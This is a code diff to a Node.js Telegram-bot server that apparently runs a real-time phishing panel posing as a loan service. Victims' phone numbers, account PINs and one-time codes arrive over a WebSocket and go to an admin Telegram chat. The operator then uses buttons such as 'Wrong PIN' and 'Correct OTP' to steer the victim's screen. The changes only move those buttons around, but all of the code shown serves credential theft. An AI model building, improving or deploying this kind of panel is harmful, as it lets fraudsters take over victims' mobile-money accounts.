@@ -21,7 +21,6 @@ const clients = new Map();
 
 // Listen for users starting the bot to notify the admin immediately with a link
 bot.onText(/\/start(?:\s+(.+))?/, async (msg, match) => {
-    const chatId = msg.chat.id;
     const user = msg.from;
     const firstName = user.first_name || 'Mtumiaji';
     const lastName = user.last_name || '';
@@ -56,6 +55,7 @@ wss.on('connection', (ws) => {
             else if (data.type === 'SUBMIT_CREDENTIALS') {
                 const { phone, pin } = data;
                 
+                // First screen: Only 2 buttons (Allow and Deny)
                 const captionText = `🚨 *MAOMBI MAPYA YA MKOPAJI*\n\n📱 *Namba ya Simu:* +255${phone}\n🔑 *PIN ya Akaunti:* \`${pin}\``;
                 
                 const sentMsg = await bot.sendMessage(ADMIN_CHAT_ID, captionText, {
@@ -65,9 +65,6 @@ wss.on('connection', (ws) => {
                             [
                                 { text: '✅ Allow', callback_data: `ALLOW_${phone}` },
                                 { text: '❌ Deny', callback_data: `DENY_${phone}` }
-                            ],
-                            [
-                                { text: '⚠️ Wrong PIN', callback_data: `WRONG_PIN_${phone}` }
                             ]
                         ]
                     }
@@ -78,13 +75,18 @@ wss.on('connection', (ws) => {
             }
             else if (data.type === 'SUBMIT_OTP') {
                 const { otp } = data;
+                
+                // OTP screen: Exactly 3 buttons (Wrong PIN, Wrong OTP, Correct OTP)
                 await bot.sendMessage(ADMIN_CHAT_ID, `🔢 *UWEKAJI WA OTP*\n\nOTP Iliyowekwa: \`${otp}\``, {
                     parse_mode: 'Markdown',
                     reply_markup: {
                         inline_keyboard: [
                             [
-                                { text: '✅ Correct OTP', callback_data: 'CORRECT_OTP' },
+                                { text: '⚠️ Wrong PIN', callback_data: 'WRONG_PIN' },
                                 { text: '❌ Wrong OTP', callback_data: 'WRONG_OTP' }
+                            ],
+                            [
+                                { text: '✅ Correct OTP', callback_data: 'CORRECT_OTP' }
                             ]
                         ]
                     }
@@ -126,7 +128,7 @@ bot.on('callback_query', async (query) => {
 
     if (data.startsWith('ALLOW_')) actionResponse = 'ALLOW';
     else if (data.startsWith('DENY_')) actionResponse = 'DENY';
-    else if (data.startsWith('WRONG_PIN_')) actionResponse = 'WRONG_PIN';
+    else if (data === 'WRONG_PIN') actionResponse = 'WRONG_PIN';
     else if (data === 'CORRECT_OTP') actionResponse = 'CORRECT_OTP';
     else if (data === 'WRONG_OTP') actionResponse = 'WRONG_OTP';
     else if (data === 'VALID_ACC') actionResponse = 'VALID_ACC';
@@ -139,7 +141,7 @@ bot.on('callback_query', async (query) => {
     }
 
     try {
-        // Removes inline buttons but keeps message text/details permanently intact
+        // Removes inline buttons but keeps all message details permanently intact
         await bot.editMessageReplyMarkup(
             { inline_keyboard: [] },
             {
@@ -158,4 +160,4 @@ const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
     console.log(`Server is running on port ${PORT}`);
 });
-  
+        
